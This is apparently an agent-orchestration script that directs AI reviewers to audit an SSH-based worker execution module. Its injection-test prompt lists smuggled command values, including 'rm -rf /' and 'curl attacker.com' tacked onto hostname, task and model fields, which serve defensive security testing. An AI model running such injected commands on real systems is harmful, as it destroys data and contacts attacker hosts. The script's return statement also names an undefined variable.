#!/usr/bin/env node
export const meta = {
  name: 'review-distribution-fix',
  description: 'Independent review of execute-on-worker implementation - adversarial verification',
  phases: [
    { title: 'Code Review', detail: '4 reviewers check execute-on-worker.js' },
    { title: 'Security Audit', detail: '2 agents hunt for SSH vulnerabilities' },
    { title: 'Integration Test', detail: 'Actually run it on a worker' },
    { title: 'Arbiter', detail: 'Final production-ready verdict' }
  ]
};

export default async function({ args, phase, log, agent, parallel, workflow }) {

// Get next arbiter from rotation
phase('Get Arbiter');
const arbiterChoice = await workflow('get-next-arbiter', { taskType: 'code_review' });
log(`Arbiter for this run: ${arbiterChoice.arbiter} (previous: ${arbiterChoice.previous || 'none'})`);

phase('Code Review');

log('4 independent reviewers checking execute-on-worker implementation...');

const codeReviews = await parallel([
  // Review 1: SSH security
  () => agent(`ADVERSARIAL SECURITY REVIEW: execute-on-worker.js

Review shared/execute-on-worker.js for SSH injection vulnerabilities:

1. Is the worker hostname validated?
2. Is the task content properly escaped?
3. Can base64 encoding be bypassed?
4. Are temp files cleaned up on failure?
5. Can an attacker inject SSH options?

Try to find exploits. Read the actual code.

Return JSON:
{
  "ssh_injection_possible": true/false,
  "vulnerabilities_found": [],
  "grade": "A/B/C/F",
  "exploitable": true/false
}`,
  { label: 'SSH security audit', model: 'opus', effort: 'high' }),

  // Review 2: Does it actually distribute?
  () => agent(`ARCHITECTURE REVIEW: Does it actually distribute?

Check shared/execute-on-worker.js and mcp-servers/fleet-orchestrator/tools/fleet-execute.js:

KEY QUESTION: When fleet-execute.js calls executeOnWorker(), does the API call:
A) Run on aio-01 (orchestrator) - WRONG
B) Run on the selected worker via SSH - CORRECT

Trace the execution path:
1. Where does the fetch() call happen?
2. Which machine's credentials are used?
3. Which machine's IP originates the API request?

Return JSON:
{
  "actually_distributes": true/false,
  "api_call_location": "aio-01 | worker",
  "evidence": "...",
  "grade": "A/B/C/F"
}`,
  { label: 'Distribution verification', model: 'sonnet', effort: 'high' }),

  // Review 3: Error handling
  () => agent(`ERROR HANDLING REVIEW: execute-on-worker.js

Check error handling in shared/execute-on-worker.js:

1. What happens if SSH connection fails?
2. What happens if worker script fails?
3. What happens if API call times out?
4. Are temp files cleaned up on error?
5. Are error messages informative?

Return JSON:
{
  "error_handling_complete": true/false,
  "missing_error_cases": [],
  "grade": "A/B/C/F"
}`,
  { label: 'Error handling review', model: 'haiku', effort: 'medium' }),

  // Review 4: Integration check
  () => agent(`INTEGRATION REVIEW: fleet-execute.js changes

Check mcp-servers/fleet-orchestrator/tools/fleet-execute.js:

1. Is executeOnWorker imported correctly?
2. Is it called with correct parameters?
3. Does it replace executeRemoteLLMTask?
4. Are return values compatible?
5. Does database tracking still work?

Return JSON:
{
  "integration_correct": true/false,
  "breaking_changes": [],
  "grade": "A/B/C/F"
}`,
  { label: 'Integration review', model: 'opus', effort: 'medium' })
]);

const reviewsSuccess = codeReviews.filter(Boolean);
log('Code reviews: ' + reviewsSuccess.length + '/4 completed');

phase('Security Audit');

const securityAudits = await parallel([
  // Audit 1: SSH command injection
  () => agent(`SSH COMMAND INJECTION TESTING:

Test execute-on-worker.js for injection:

1. Worker hostname injection:
   - Try: worker='evil-host; rm -rf /'
   - Try: worker='localhost && curl attacker.com'
   - Try: worker='-o ProxyCommand=evil'

2. Task content injection:
   - Try: task='$(rm -rf /)'
   - Try: task with backticks, semicolons, newlines
   - Does base64 encoding prevent all injection?

3. Model parameter injection:
   - Try: model='opus; curl attacker.com'

Actually test with malicious inputs. Report if EXPLOITABLE.

Return JSON:
{
  "worker_injection_blocked": true/false,
  "task_injection_blocked": true/false,
  "model_injection_blocked": true/false,
  "exploitable": true/false,
  "payloads_tested": []
}`,
  { label: 'Injection testing', model: 'opus', effort: 'high' }),

  // Audit 2: Resource exhaustion
  () => agent(`RESOURCE EXHAUSTION TESTING:

Check execute-on-worker.js for DoS vectors:

1. Temp file cleanup:
   - What if script fails before cleanup?
   - Can attacker exhaust disk space with temp files?

2. SSH connection limits:
   - What if 1000 concurrent executeOnWorker calls?
   - Are SSH connections pooled or spawned each time?

3. Timeout handling:
   - What if worker hangs forever?
   - Is there a hard timeout?

Return JSON:
{
  "temp_file_leak_possible": true/false,
  "ssh_exhaustion_possible": true/false,
  "timeout_enforced": true/false,
  "grade": "A/B/C/F"
}`,
  { label: 'Resource testing', model: 'sonnet', effort: 'medium' })
]);

const auditsSuccess = securityAudits.filter(Boolean);
log('Security audits: ' + auditsSuccess.length + '/2 completed');

phase('Integration Test');

const integrationTest = await agent(`LIVE INTEGRATION TEST:

Actually test execute-on-worker on a real worker:

1. Pick a worker (e.g., pi-02)

2. Before test:
   ssh claude@pi-02 'ps aux | grep node'
   (should see NO claude-global-skills node processes)

3. Run test:
   node -e "
   import { executeOnWorker } from './shared/execute-on-worker.js';
   const result = await executeOnWorker({
     worker: 'pi-02',
     model: 'haiku',
     task: 'Say hello',
     maxTokens: 50,
     timeoutMs: 30000
   });
   console.log(JSON.stringify(result, null, 2));
   "

4. During test (in parallel):
   ssh claude@pi-02 'ps aux | grep node'
   (should see node process running executeRemoteLLMTask)

5. After test:
   - Check result.execution_host === 'pi-02'
   - Check result.output contains LLM response
   - Check no temp files left on pi-02

Return JSON:
{
  "test_passed": true/false,
  "worker_executed": true/false,
  "correct_worker": true/false,
  "temp_files_cleaned": true/false,
  "error_if_any": "..."
}`,
{ label: 'Live integration test', model: 'sonnet', effort: 'high' });

phase('Arbiter');

const arbiter = await agent(`ARBITER: Final verdict on execute-on-worker fix

Synthesize all reviews:
- 4 code reviews
- 2 security audits
- 1 integration test

ANSWER THESE QUESTIONS:

1. Does execute-on-worker actually distribute work to workers via SSH?
2. Are there any SSH injection vulnerabilities?
3. Does it integrate correctly with fleet-execute.js?
4. Did the live test work?
5. Is this production-ready?

Return JSON:
{
  "actually_distributes": true/false,
  "security_vulnerabilities": [],
  "integration_works": true/false,
  "live_test_passed": true/false,
  "production_ready": true/false,
  "grade": "A/B/C/F",
  "blocking_issues": [],
  "recommendations": []
}`,
{ label: 'Final arbiter verdict', model: arbiterChoice.arbiter, effort: 'high' });

// Update arbiter state for rotation tracking
phase('Update Arbiter State');
await workflow('update-arbiter-state', { arbiter: arbiterChoice.arbiter, workflow_name: 'review-distribution-fix' });

log('Review of distribution fix complete!');

return {
  code_reviews: reviewsSuccess.length,
  security_audits: auditsSuccess.length,
  integration_test,
  arbiter_verdict: arbiter,
  total_agents: 8,
  production_ready: arbiter?.production_ready || false
};

}
